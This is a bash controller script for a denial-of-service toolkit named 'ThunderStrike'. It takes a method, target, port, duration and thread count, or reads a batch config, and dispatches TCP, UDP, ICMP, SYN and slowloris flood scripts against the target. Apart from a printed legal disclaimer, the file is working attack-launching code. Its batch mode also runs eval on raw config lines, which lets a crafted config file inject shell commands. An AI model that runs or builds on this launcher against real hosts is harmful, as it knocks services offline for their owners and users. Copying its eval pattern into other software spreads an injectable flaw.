#!/bin/bash
#
# ThunderStrike - Advanced DoS Testing Toolkit [Main Controller]
# Author: CyberGuard-Anil
#
# ETHICAL TESTING ONLY—You must have explicit written permission!
#

# Source utilities
source utils/validator.sh
source utils/logger.sh
source utils/checker.sh
source core/banner.sh

# Global variables/defaults
TARGET=""
PORT=""
DURATION=""
METHOD=""
THREADS=""
LOGGING=false
CONFIG_FILE=""

CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Display usage and legal note
usage() {
    show_banner
    echo -e "${YELLOW}══════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  ETHICAL & LEGAL USE ONLY! Unauthorized use is a crime.${NC}"
    echo -e "${YELLOW}══════════════════════════════════════════════════════${NC}"
    echo -e "\n${CYAN}Usage: $0 [OPTIONS]${NC}"
    echo -e "${YELLOW}Options:${NC}"
    echo -e "  -m, --method    Attack method (tcp, udp, icmp, syn, slowloris, synpy, slowpy, udpg)"
    echo -e "  -t, --target    Target IP address or hostname"
    echo -e "  -p, --port      Target port (default: 80)"
    echo -e "  -d, --duration  Duration in seconds"
    echo -e "  -r, --threads   Number of threads/goroutines (default: 100)"
    echo -e "  -l, --log       Enable logging"
    echo -e "  -c, --config    Config file for batch/preset run"
    echo -e "  -h, --help      Show this message"
    echo -e "\n${GREEN}Examples:${NC}"
    echo -e "  $0 -m tcp -t 192.168.1.100 -p 80 -d 60 -l"
    echo -e "  $0 -m synpy -t example.com -p 443 -d 30 -r 200"
    echo -e "  $0 -c extensions/conf_attack.yaml"
    exit 1
}

# Arg parsing
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -m|--method)     METHOD="$2"; shift 2 ;;
            -t|--target)     TARGET="$2"; shift 2 ;;
            -p|--port)       PORT="$2"; shift 2 ;;
            -d|--duration)   DURATION="$2"; shift 2 ;;
            -r|--threads)    THREADS="$2"; shift 2 ;;
            -l|--log)        LOGGING=true; shift ;;
            -c|--config)     CONFIG_FILE="$2"; shift 2 ;;
            -h|--help)       usage ;;
            *) echo -e "${RED}Unknown option: $1${NC}"; usage ;;
        esac
    done
}

# Batch mode: config file support (YAML line by line: method,target,port,duration,threads)
run_batch_mode() {
    if [[ ! -f "$CONFIG_FILE" ]]; then
      echo -e "${RED}Config file not found: $CONFIG_FILE${NC}"
      exit 1
    fi
    echo -e "${CYAN}Running batch attacks from config: $CONFIG_FILE${NC}"
    local line_num=0
    while IFS= read -r line; do
        [[ "$line" =~ ^([[:space:]]*#|[[:space:]]*$) ]] && continue  # Skip comments/empty
        # Expect YAML-style: method: syn, target: 1.2.3.4, port: 80, duration: 60, threads: 200
        line_num=$((line_num+1))
        eval $(echo "$line" | sed 's/,/ /g' | sed 's/:/=/g')
        if [[ -z "$method" || -z "$target" ]]; then
            echo -e "${RED}[Config line $line_num] Missing method/target. Skipping.${NC}"
            continue
        fi
        # Set defaults
        port=${port:-80}; duration=${duration:-60}; threads=${threads:-100}
        # Validate
        validate_ip "$target"
        validate_port "$port"
        validate_duration "$duration"
        # Logging
        if [[ "$LOGGING" == true ]]; then
            log_attack "$method" "$target" "$port" "$duration" "$threads"
        fi
        # Dispatch
        echo -e "${GREEN}[BATCH] Launching $method at $target:$port for $duration s...${NC}"
        METHOD="$method" TARGET="$target" PORT="$port" DURATION="$duration" THREADS="$threads" execute_attack
    done < "$CONFIG_FILE"
    echo -e "${CYAN}All batch attacks from config completed.${NC}"
    exit 0
}

# Unified attack dispatcher
execute_attack() {
    case $METHOD in
        tcp)
            bash core/tcp_flood.sh "$TARGET" "$PORT" "$DURATION" "$THREADS"
            ;;
        udp)
            bash core/udp_flood.sh "$TARGET" "$PORT" "$DURATION" "$THREADS"
            ;;
        icmp)
            bash core/icmp_flood.sh "$TARGET" "$DURATION" "$THREADS"
            ;;
        syn)
            bash attacks/syn_flood.sh "$TARGET" "$PORT" "$DURATION" "$THREADS"
            ;;
        slowloris)
            bash attacks/slowloris.sh "$TARGET" "$PORT" "$DURATION" "$THREADS"
            ;;
        synpy)
            python3 extensions/syn_flood.py -t "$TARGET" -p "$PORT" -d "$DURATION" -r "$THREADS"
            ;;
        slowpy)
            python3 extensions/slowloris.py -t "$TARGET" -p "$PORT" -d "$DURATION" -c "$THREADS"
            ;;
        udpg)
            go run extensions/udp_flood.go -t "$TARGET" -p "$PORT" -d "$DURATION" -r "$THREADS"
            ;;
        *)
            echo -e "${RED}Invalid or unsupported method: $METHOD${NC}"; usage ;;
    esac
}

main() {
    show_banner
    check_dependencies

    parse_args "$@"

    # Config file batch mode
    if [[ -n "$CONFIG_FILE" ]]; then
        run_batch_mode
    fi

    # Direct mode
    if [[ -z "$METHOD" || -z "$TARGET" ]]; then
        echo -e "${RED}Error: Method and target are required${NC}"
        usage
    fi

    # Set defaults
    PORT=${PORT:-80}
    DURATION=${DURATION:-60}
    THREADS=${THREADS:-100}

    # Validation (refuses to run on invalid input)
    validate_ip "$TARGET"
    validate_port "$PORT"
    validate_duration "$DURATION"

    # Log if enabled
    if [[ "$LOGGING" == true ]]; then
      log_attack "$METHOD" "$TARGET" "$PORT" "$DURATION" "$THREADS"
    fi

    echo -e "${GREEN}Launching $METHOD attack against $TARGET:$PORT for $DURATION seconds...${NC}"
    execute_attack

    echo -e "${GREEN}Attack completed. For environment reset, run: ./utils/cleanup.sh${NC}"
}

main "$@"

